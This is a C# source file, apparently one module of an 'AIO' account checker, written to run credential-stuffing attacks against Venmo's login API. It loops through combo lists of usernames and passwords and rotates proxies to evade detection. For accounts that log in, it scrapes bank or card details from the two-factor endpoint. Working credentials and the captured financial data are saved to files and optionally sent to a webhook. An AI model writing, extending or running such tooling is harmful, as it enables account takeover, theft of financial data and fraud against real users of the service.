using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Venmomod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            //Console.WriteLine(guid);
                            var guid = Guid.NewGuid().ToString();
                            var cookies = new CookieStorage();
                            var csrfToken = VenmoGetCSRF(ref cookies);

                            req.Cookies = cookies;
                            req.UserAgent = "Venmo/8.4.0 (iPhone; iOS 13.2; Scale/3.0)";
                            req.AddHeader("Content-Type", "application/json");
                            req.AddHeader("Accept", "application/json; charset=utf-8");
                            req.AddHeader("Accept-Language", "en-US;q=1.0,el-GR;q=0.9");
                            req.AddHeader("device-id", guid);
                            req.AddHeader("csrftoken2", csrfToken);

                            var res = req.Post(new Uri("https://api.venmo.com/v1/oauth/access_token"),
                                new BytesContent(Encoding.Default.GetBytes("{\"phone_email_or_username\":\"" +
                                                                           array[0] + "\",\"password\":\"" + array[1] +
                                                                           "\",\"client_id\":\"1\"}")));
                            var strResponse = res.ToString();
                            if (strResponse.Contains("Additional authentication is required"))
                            {
                                var secret = res["venmo-otp-secret"];
                                var capture = "";
                                capture = VenmoGetCaptures(cookies, secret, guid);
                                if (capture == "Free")
                                {
                                    Program.Frees++;
                                    Program.TotalChecks++;
                                    Export.AsResult("/Venmo_frees", array[0] + ":" + array[1]);
                                    if (Program.lorc == "LOG") Settings.PrintFree("Venmo", array[0] + ":" + array[1]);
                                }
                                else
                                {
                                    Program.Hits++;
                                    Program.TotalChecks++;
                                    Export.AsResult("/Venmo_hits", array[0] + ":" + array[1] + " | " + capture);
                                    if (Program.lorc == "LOG")
                                        Settings.PrintHit("Venmo", array[0] + ":" + array[1] + " | " + capture);
                                    if (Settings.sendToWebhook)
                                        Settings.sendTowebhook1(array[0] + ":" + array[1] + " | " + capture,
                                            "Venmo Hits");
                                }
                            }
                            else if (strResponse.Contains("{\"message\": \"Your email or password was incorrect.\""))
                            {
                                Program.Fails++;
                                Program.TotalChecks++;
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string VenmoGetCSRF(ref CookieStorage cookies)
        {
            while (true)
                try
                {
                    using (var req = new HttpRequest())
                    {
                        switch (Program.ProxyType1)
                        {
                            case "HTTP":
                                req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS4":
                                req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS5":
                                req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                        }

                        cookies = new CookieStorage();
                        req.Cookies = cookies;
                        req.UserAgent =
                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36";

                        req.Post(new Uri("https://api.venmo.com/v1/oauth/access_token"), "{}", "application/json")
                            .ToString();

                        return cookies.GetCookies("https://api.venmo.com/")["csrftoken2"].Value;
                    }
                }
                catch
                {
                    Program.Errors++;
                }

            return "";
        }

        private static string VenmoGetCaptures(CookieStorage cookies, string secret, string guid)
        {
            while (true)
                try
                {
                    using (var req = new HttpRequest())
                    {
                        switch (Program.ProxyType1)
                        {
                            case "HTTP":
                                req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS4":
                                req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS5":
                                req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                        }

                        req.AddHeader("device-id", guid);
                        req.AddHeader("Venmo-Otp-Secret", secret);
                        req.AddHeader("Content-Type", "application/json; charset=utf-8");
                        req.AddHeader("Venmo-Otp", "501107");
                        req.UserAgent = "Venmo/8.6.0 (iPhone; iOS 14.0; Scale/3.0)";
                        req.Cookies = cookies;

                        var strResponse =
                            req.Get(new Uri("https://api.venmo.com/v1/account/two-factor/token?client_id=1"))
                                .ToString();

                        if (strResponse.Contains("\", \"question_type\": \"card\"}]"))
                        {
                            var bankInfo = Regex
                                .Match(strResponse, "\\[{\"value\": \"(.*?)\", \"question_type\": \"card\"}").Groups[1]
                                .Value;

                            return $"Bank Infomation: {bankInfo}";
                        }

                        return "Free";
                        break;
                    }
                }
                catch
                {
                    Program.Errors++;
                }

            return "";
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}